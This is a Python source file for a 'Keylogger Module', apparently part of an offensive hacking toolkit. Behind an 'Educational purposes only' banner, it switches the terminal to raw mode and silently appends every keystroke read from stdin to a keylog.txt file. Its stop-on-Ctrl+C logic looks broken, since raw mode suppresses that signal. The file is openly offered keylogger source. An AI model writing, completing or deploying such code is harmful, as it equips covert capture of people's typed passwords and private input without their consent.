#!/usr/bin/env python3
# Keylogger Module

import os
import time
import threading
from core.colors import Colors
from config.settings import DATA_DIR

class KeyloggerModule:
    def __init__(self):
        self.name = "Keylogger Module"
        self.running = False
    
    def run(self):
        print(f"\n{Colors.YELLOW}[!] Educational purposes only{Colors.END}")
        print(f"{Colors.CYAN}[*] Starting keylogger (Ctrl+C to stop){Colors.END}")
        
        log_file = f"{DATA_DIR}/keylog.txt"
        
        def log_keys():
            import sys
            import termios
            import tty
            
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setraw(fd)
                while self.running:
                    ch = sys.stdin.read(1)
                    if ch:
                        with open(log_file, 'a') as f:
                            f.write(ch)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
        
        self.running = True
        thread = threading.Thread(target=log_keys, daemon=True)
        thread.start()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Colors.GREEN}[+] Keylogger stopped. Log: {log_file}{Colors.END}")
